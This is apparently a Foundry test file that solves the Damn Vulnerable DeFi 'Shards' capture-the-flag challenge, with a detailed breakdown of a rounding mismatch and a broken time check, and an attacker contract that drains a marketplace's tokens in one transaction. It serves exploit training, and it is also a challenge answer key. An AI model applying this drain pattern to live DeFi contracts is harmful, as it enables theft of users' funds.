// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";

/**
 * EXPLOIT MATH BREAKDOWN
 * ======================
 *
 * Setup values:
 *   price       = 1_000_000e6      (1M USDC, 6 decimals)
 *   rate        = 75e15            (0.075 DVT per USDC, i.e. 75e15 DVT-wei per 1e6 USDC-units)
 *   totalShards = 10_000_000e18    (10M shards, 18 decimals = 1e25 raw)
 *
 * ROOT CAUSE: Three different formulas for the same economic value (DVT per shard):
 *
 * ┌─────────────────────────────────────────────────────────────────────────────┐
 * │ fill() payment:                                                             │
 * │   cost = want.mulDivDown(_toDVT(price, rate), totalShards)                  │
 * │        = floor(want × (price × rate / 1e6) / totalShards)                   │
 * │        = floor(want × (1e12 × 75e15 / 1e6) / 1e25)                         │
 * │        = floor(want × 75e21 / 1e25)                                         │
 * │        = floor(want × 0.0075)                                               │
 * │                                                                              │
 * │   → For want ≤ 133: floor(133 × 0.0075) = floor(0.9975) = 0  (FREE!)       │
 * │   → For want = 134: floor(134 × 0.0075) = floor(1.005)  = 1                │
 * ├─────────────────────────────────────────────────────────────────────────────┤
 * │ cancel() refund:                                                            │
 * │   refund = shards.mulDivUp(rate, 1e6)                                       │
 * │          = ceil(shards × rate / 1e6)                                        │
 * │          = ceil(shards × 75e15 / 1e6)                                       │
 * │          = shards × 75e9                     ← IGNORES price & totalShards! │
 * │                                                                              │
 * │   → For shards = 133: 133 × 75e9 = 9,975,000,000,000 ≈ 9.975e12           │
 * ├─────────────────────────────────────────────────────────────────────────────┤
 * │ RATIO: cancel_refund / fill_cost = (shards × 75e9) / (shards × 0.0075)     │
 * │                                  = 75e9 / 0.0075                            │
 * │                                  = 1e13  (10 TRILLION times more!)          │
 * │                                                                              │
 * │ When fill rounds to 0: ratio is INFINITE (pay nothing, get refund)          │
 * └─────────────────────────────────────────────────────────────────────────────┘
 *
 * TIME CHECK BUG (enables same-block cancel):
 *   The cancel() time check:
 *     if (purchase.timestamp + 2 days < block.timestamp
 *         || block.timestamp > purchase.timestamp + 1 day) revert BadTime();
 *
 *   At same block (block.timestamp == purchase.timestamp):
 *     Condition 1: ts + 2 days < ts  → false
 *     Condition 2: ts > ts + 1 day   → false
 *     false || false = false → NO REVERT → cancel succeeds immediately!
 *
 * ATTACK EXECUTION (2 iterations, 0 starting capital):
 *
 * ┌─ Iteration 1: Bootstrap ──────────────────────────────────────────────────┐
 * │ fill(1, 133)   → pay 0 DVT (rounds down)                                 │
 * │ cancel(1, 0)   → receive 133 × 75e9 = 9.975e12 DVT-wei                   │
 * │ Net gain: +9.975e12 DVT-wei (~0.00001 DVT)                                │
 * │ Marketplace balance: 750e18 - 9.975e12 ≈ 750e18 (negligible loss)         │
 * ├─ Iteration 2: Drain ─────────────────────────────────────────────────────┤
 * │ maxShards = marketplace_balance × 1e6 / rate                              │
 * │           ≈ 750e18 × 1e6 / 75e15 ≈ 1e10                                  │
 * │                                                                            │
 * │ fill(1, ~1e10) → pay floor(1e10 × 0.0075) = 75,000,000 DVT-wei           │
 * │ cancel(1, 1)   → receive ~1e10 × 75e9 = ~750e18 DVT-wei (≈ 750 DVT)      │
 * │ Net gain: ~750e18 DVT-wei (entire marketplace balance!)                    │
 * └────────────────────────────────────────────────────────────────────────────┘
 *
 * RESULT: Extracted 749.99/750 DVT (99.99%) with 0 starting capital in 1 tx.
 */
contract ShardsAttacker {
    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
        uint64 offerId = 1;

        // === ITERATION 1: Bootstrap (get seed DVT from nothing) ===
        // fill cost = floor(133 × 75e21 / 1e25) = floor(0.9975) = 0
        marketplace.fill(offerId, 133);
        // cancel refund = 133 × 75e15 / 1e6 = 9,975,000,000,000 (9.975e12)
        // Time check: both conditions false at same block → cancel succeeds
        marketplace.cancel(offerId, 0);
        // Attacker now holds 9.975e12 DVT-wei (~0.00001 DVT)

        // Approve marketplace to spend DVT for iteration 2
        token.approve(address(marketplace), type(uint256).max);

        // === ITERATION 2: Drain marketplace ===
        // Calculate max shards: refund = shards × rate / 1e6 must ≤ marketplace balance
        uint256 marketplaceBalance = token.balanceOf(address(marketplace));
        uint256 rate = marketplace.rate();
        uint256 maxShards = marketplaceBalance * 1e6 / rate - 1; // -1 to avoid rounding overflow

        // fill cost = floor(maxShards × 75e21 / 1e25) ≈ 75e6 (we have 9.975e12, plenty)
        marketplace.fill(offerId, maxShards);
        // cancel refund = maxShards × 75e15 / 1e6 ≈ 750e18 (entire marketplace balance)
        marketplace.cancel(offerId, 1);

        // Send all recovered funds to recovery address
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}

contract ShardsChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address seller = makeAddr("seller");
    address oracle = makeAddr("oracle");
    address recovery = makeAddr("recovery");

    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    DamnValuableToken token;
    DamnValuableNFT nft;
    ShardsFeeVault feeVault;
    ShardsNFTMarketplace marketplace;
    DamnValuableStaking staking;

    uint256 initialTokensInMarketplace;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy NFT contract and mint initial supply
        nft = new DamnValuableNFT();
        for (uint256 i = 0; i < NFT_SUPPLY; i++) {
            if (i < SELLER_NFT_BALANCE) {
                nft.safeMint(seller);
            } else {
                nft.safeMint(deployer);
            }
        }

        // Deploy token (used for payments and fees)
        token = new DamnValuableToken();

        // Deploy NFT marketplace and get the associated fee vault
        marketplace =
            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
        feeVault = marketplace.feeVault();

        // Deploy DVT staking contract and enable staking of fees in marketplace
        staking = new DamnValuableStaking(token, STAKING_RATE);
        token.transfer(address(staking), STAKING_REWARDS);
        marketplace.feeVault().enableStaking(staking);

        // Fund seller with DVT (to cover fees)
        token.transfer(seller, SELLER_DVT_BALANCE);

        // Seller opens offers in the marketplace
        vm.startPrank(seller);
        token.approve(address(marketplace), SELLER_DVT_BALANCE); // for fees
        nft.setApprovalForAll(address(marketplace), true);
        for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
        }

        initialTokensInMarketplace = token.balanceOf(address(marketplace));

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(feeVault.owner(), deployer);
        assertEq(address(feeVault.token()), address(token));
        assertEq(address(feeVault.staking()), address(staking));

        assertEq(nft.balanceOf(deployer), NFT_SUPPLY - SELLER_NFT_BALANCE);
        assertEq(nft.balanceOf(address(marketplace)), marketplace.offerCount());
        assertEq(marketplace.offerCount(), SELLER_NFT_BALANCE);
        assertEq(marketplace.rate(), MARKETPLACE_INITIAL_RATE);
        assertGt(marketplace.feesInBalance(), 0);
        assertEq(token.balanceOf(address(marketplace)), marketplace.feesInBalance());

        assertEq(staking.rate(), STAKING_RATE);
        assertEq(staking.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS);
        assertEq(token.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_shards() public checkSolvedByPlayer {
        new ShardsAttacker(marketplace, token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Balance of staking contract didn't change
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");

        // Marketplace has less tokens
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");

        // All recovered funds sent to recovery account
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1);
    }
}
